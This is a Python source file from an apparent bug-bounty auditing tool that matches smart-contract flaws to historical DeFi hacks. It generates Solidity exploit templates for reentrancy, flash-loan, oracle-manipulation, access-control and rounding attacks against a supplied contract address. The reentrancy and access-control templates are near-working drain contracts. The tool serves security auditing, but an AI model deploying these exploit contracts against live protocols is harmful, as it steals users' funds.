"""
Pattern Matcher Agent

Matches vulnerabilities to historical exploit patterns from DefiHackLabs.
Helps agents learn from 680+ past DeFi hacks.

ENHANCED: Now uses comprehensive vulnerability knowledge base with 60+ patterns!
"""

from typing import List, Optional, Dict
from dataclasses import dataclass
from vulnhunter.defihacklabs_db import (
    DefiHackLabsDB, 
    ExploitRecord, 
    build_exploit_database,
    get_vulnerability_type_list,
)
from vulnhunter.vulnerability_knowledge_base import (
    VULNERABILITY_PATTERNS,
    VulnerabilityPattern,
    get_vulnerability_categories,
    generate_comprehensive_audit_prompt,
    generate_creative_thinking_prompt,
)


@dataclass
class ExploitSuggestion:
    """Suggestion based on historical exploit."""
    name: str
    date: str
    vulnerability_type: str
    description: str
    pattern: str
    dollar_value: Optional[float]
    file_path: str
    confidence: float
    attack_vector: str = ""
    real_hack_code_available: bool = False


class PatternMatcherAgent:
    """
    Agent for matching found vulnerabilities to historical exploits.
    
    Uses:
    - DefiHackLabs database (680+ exploits)
    - Comprehensive vulnerability knowledge base (60+ patterns)
    - Creative attack thinking prompts
    """
    
    def __init__(self, db_path: str = "/home/grey/Desktop/bugbounty/DeFiHackLabs"):
        """Initialize with DefiHackLabs database and knowledge base."""
        self.db = build_exploit_database(db_path)
        self.knowledge_base = VULNERABILITY_PATTERNS
        print(f"PatternMatcher: Loaded {len(self.db.exploits)} historical exploits")
        print(f"PatternMatcher: Loaded {len(self.knowledge_base)} vulnerability patterns")
        
    def find_similar_exploits(
        self,
        vulnerability_type: str,
        limit: int = 5
    ) -> List[ExploitSuggestion]:
        """
        Find similar historical exploits by vulnerability type.
        
        Args:
            vulnerability_type: Type of vulnerability (reentrancy, flashloan, etc.)
            limit: Maximum number of suggestions
            
        Returns:
            List of ExploitSuggestion objects
        """
        # Search database
        similar = self.db.find_similar(vulnerability_type, limit=limit)
        
        # Get pattern from knowledge base
        kb_pattern = self._get_kb_pattern(vulnerability_type)
        
        suggestions = []
        for idx, exploit in enumerate(similar):
            # Generate suggestion
            suggestion = ExploitSuggestion(
                name=exploit.name,
                date=exploit.date.strftime("%Y-%m"),
                vulnerability_type=exploit.vulnerability_type,
                description=exploit.description,
                pattern=kb_pattern.attack_vector if kb_pattern else self._extract_pattern(exploit),
                dollar_value=exploit.dollar_value,
                file_path=exploit.file_path,
                confidence=1.0 - (idx * 0.1),
                attack_vector=kb_pattern.attack_vector if kb_pattern else "",
                real_hack_code_available=True,
            )
            suggestions.append(suggestion)
        
        return suggestions
    
    def _get_kb_pattern(self, vulnerability_type: str) -> Optional[VulnerabilityPattern]:
        """Get matching pattern from knowledge base."""
        vuln_lower = vulnerability_type.lower()
        
        for pattern_id, pattern in self.knowledge_base.items():
            if vuln_lower in pattern_id.lower() or vuln_lower in pattern.category.lower():
                return pattern
            if vuln_lower in pattern.name.lower():
                return pattern
        
        return None
    
    def _extract_pattern(self, exploit: ExploitRecord) -> str:
        """
        Extract attack pattern from historical exploit.
        
        Args:
            exploit: ExploitRecord object
            
        Returns:
            Human-readable attack pattern description
        """
        # First try knowledge base
        kb_pattern = self._get_kb_pattern(exploit.vulnerability_type)
        if kb_pattern:
            return kb_pattern.attack_vector
        
        # Fallback patterns
        patterns = {
            "reentrancy": "1. Call vulnerable function\n2. In callback, re-enter before state update\n3. Drain funds",
            "flashloan": "1. Borrow large amount via flash loan\n2. Manipulate price/state\n3. Profit from manipulation\n4. Repay loan",
            "oracle_manipulation": "1. Identify price oracle dependency\n2. Manipulate oracle via DEX\n3. Execute profitable action\n4. Restore price",
            "price_manipulation": "1. Flash loan large amount\n2. Swap to move price\n3. Exploit mispriced action\n4. Reverse swap, repay loan",
            "access_control": "1. Find unprotected function\n2. Call directly without auth\n3. Extract value or change state",
            "logic_flaw": "1. Analyze business logic\n2. Find edge case not handled\n3. Exploit unexpected behavior",
            "precision_loss": "1. Find division before multiplication\n2. Provide inputs to maximize rounding error\n3. Accumulate gains over many transactions",
        }
        
        return patterns.get(exploit.vulnerability_type, "Analyze exploit code for attack pattern")
    
    def get_all_vulnerability_types(self) -> Dict[str, int]:
        """Get all vulnerability types with counts from database."""
        stats = self.db.get_statistics()
        return stats.get("vulnerability_types", {})
    
    def get_comprehensive_checklist(self) -> str:
        """Get the full vulnerability checklist for thorough auditing."""
        return generate_comprehensive_audit_prompt()
    
    def get_creative_prompts(self) -> str:
        """Get creative thinking prompts for out-of-box attacks."""
        return generate_creative_thinking_prompt()
    
    def generate_exploit_template(
        self,
        vulnerability_type: str,
        target_contract: str
    ) -> str:
        """
        Generate Solidity exploit template based on vulnerability type.
        
        Args:
            vulnerability_type: Type of vulnerability
            target_contract: Target contract address
            
        Returns:
            Solidity code template
        """
        # Get pattern from knowledge base
        kb_pattern = self._get_kb_pattern(vulnerability_type)
        
        templates = {
            "reentrancy": f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Reentrancy Exploit Template
// Pattern: External call before state update

interface ITarget {{
    function withdraw(uint amount) external;
    function deposit() external payable;
    function balanceOf(address) external view returns (uint);
}}

contract ReentrancyExploit is Test {{
    ITarget target = ITarget({target_contract});
    uint public attackCount;
    uint public initialDeposit;
    
    function attack() external payable {{
        initialDeposit = msg.value;
        target.deposit{{value: msg.value}}();
        target.withdraw(msg.value);
    }}
    
    receive() external payable {{
        if (attackCount < 10 && address(target).balance >= initialDeposit) {{
            attackCount++;
            target.withdraw(initialDeposit);
        }}
    }}
    
    function getProfit() external view returns (uint) {{
        return address(this).balance - initialDeposit;
    }}
}}
""",
            "flashloan": f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Flash Loan Exploit Template
// Pattern: Borrow → Manipulate → Profit → Repay

interface IERC20 {{
    function balanceOf(address) external view returns (uint);
    function transfer(address, uint) external returns (bool);
    function approve(address, uint) external returns (bool);
}}

interface IFlashLender {{
    function flashLoan(address receiver, address token, uint amount, bytes calldata data) external;
}}

interface ITarget {{
    // Define target interface based on vulnerability
}}

contract FlashloanExploit is Test {{
    address target = {target_contract};
    IFlashLender lender; // Balancer, AAVE, etc
    IERC20 token;
    
    function attack() external {{
        // 1. Request flash loan
        lender.flashLoan(
            address(this),
            address(token),
            1_000_000 ether, // Large amount
            ""
        );
    }}
    
    function onFlashLoan(
        address initiator,
        address token_,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {{
        // 2. Manipulate price/state
        // TODO: Implement manipulation
        
        // 3. Exploit target at manipulated state
        // TODO: Implement exploit
        
        // 4. Repay loan + fee
        IERC20(token_).transfer(msg.sender, amount + fee);
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }}
}}
""",
            "oracle_manipulation": f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Oracle Manipulation Exploit Template
// Pattern: Manipulate price source → Exploit dependent protocol

interface IUniswapV2Pair {{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}}

interface ITarget {{
    function borrow(uint amount) external;
    function getPrice() external view returns (uint);
}}

contract OracleExploit is Test {{
    ITarget target = ITarget({target_contract});
    IUniswapV2Pair pair; // Price source
    
    function attack() external {{
        // 1. Check initial price
        uint priceBefore = target.getPrice();
        
        // 2. Manipulate pair reserves (flash swap)
        // This moves the spot price
        pair.swap(largeAmount, 0, address(this), "");
    }}
    
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {{
        // 3. Price is now manipulated
        // Exploit at bad price
        target.borrow(maxAmount);
        
        // 4. Repay swap
        // Transfer tokens back to pair
    }}
}}
""",
            "access_control": f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Access Control Exploit Template
// Pattern: Call unprotected privileged function

interface ITarget {{
    function mint(address to, uint amount) external;
    function setOwner(address newOwner) external;
    function withdraw(uint amount) external;
    function initialize(address owner) external;
}}

contract AccessControlExploit is Test {{
    ITarget target = ITarget({target_contract});
    
    function exploit() external {{
        // Option 1: Call unprotected mint
        target.mint(address(this), 1_000_000 ether);
        
        // Option 2: Take ownership
        target.setOwner(address(this));
        
        // Option 3: Initialize uninitialized proxy
        target.initialize(address(this));
        
        // Option 4: Direct withdraw
        target.withdraw(target.balance);
    }}
}}
""",
            "precision_loss": f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Precision Loss Exploit Template
// Pattern: Exploit rounding errors in division

interface IVault {{
    function deposit(uint assets) external returns (uint shares);
    function withdraw(uint shares) external returns (uint assets);
    function totalAssets() external view returns (uint);
    function totalSupply() external view returns (uint);
}}

contract PrecisionExploit is Test {{
    IVault vault = IVault({target_contract});
    
    function exploit() external {{
        // First depositor attack
        // 1. Deposit minimal amount (1 wei)
        vault.deposit(1);
        
        // 2. Donate large amount directly (inflate share price)
        // token.transfer(address(vault), 1000 ether);
        
        // 3. Next depositor gets 0 shares due to rounding
        // 4. Withdraw your share of their deposit
        vault.withdraw(1);
    }}
}}
"""
        }
        
        vuln_lower = vulnerability_type.lower()
        for key, template in templates.items():
            if key in vuln_lower:
                return template
        
        # Generic template
        return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Exploit Template for {vulnerability_type}
// Target: {target_contract}
// 
// Attack Pattern:
{kb_pattern.attack_vector if kb_pattern else "// TODO: Analyze and implement"}

interface ITarget {{
    // TODO: Define target interface
}}

contract Exploit is Test {{
    ITarget target = ITarget({target_contract});
    
    function exploit() external {{
        // TODO: Implement exploit
    }}
}}
"""
    
    def get_statistics(self) -> dict:
        """Get database statistics."""
        db_stats = self.db.get_statistics()
        kb_stats = {
            "knowledge_base_patterns": len(self.knowledge_base),
            "categories": len(get_vulnerability_categories()),
        }
        return {**db_stats, **kb_stats}
    
    def format_suggestions(self, suggestions: List[ExploitSuggestion]) -> str:
        """Format suggestions for display."""
        if not suggestions:
            return "No similar historical exploits found."
        
        output = ["📚 SIMILAR HISTORICAL EXPLOITS:", ""]
        
        for idx, suggestion in enumerate(suggestions, 1):
            output.append(f"{idx}. {suggestion.name} ({suggestion.date})")
            output.append(f"   Type: {suggestion.vulnerability_type}")
            output.append(f"   Description: {suggestion.description[:100]}...")
            output.append(f"   Pattern:\n{suggestion.pattern}")
            if suggestion.dollar_value:
                output.append(f"   Value Lost: ${suggestion.dollar_value:,.0f}")
            output.append(f"   Code Available: {'Yes ✓' if suggestion.real_hack_code_available else 'No'}")
            output.append(f"   Confidence: {suggestion.confidence:.0%}")
            output.append("")
        
        return "\n".join(output)
    
    def search_by_keyword(self, keyword: str, limit: int = 10) -> List[ExploitRecord]:
        """Search exploits by keyword in name/description."""
        return self.db.find_by_pattern(keyword, limit)


# Convenience functions
def search_patterns(vulnerability_type: str, limit: int = 3) -> List[ExploitSuggestion]:
    """Quick pattern search."""
    matcher = PatternMatcherAgent()
    return matcher.find_similar_exploits(vulnerability_type, limit)


def get_audit_checklist() -> str:
    """Get comprehensive audit checklist."""
    return generate_comprehensive_audit_prompt()


def get_creative_attacks() -> str:
    """Get creative attack thinking prompts."""
    return generate_creative_thinking_prompt()
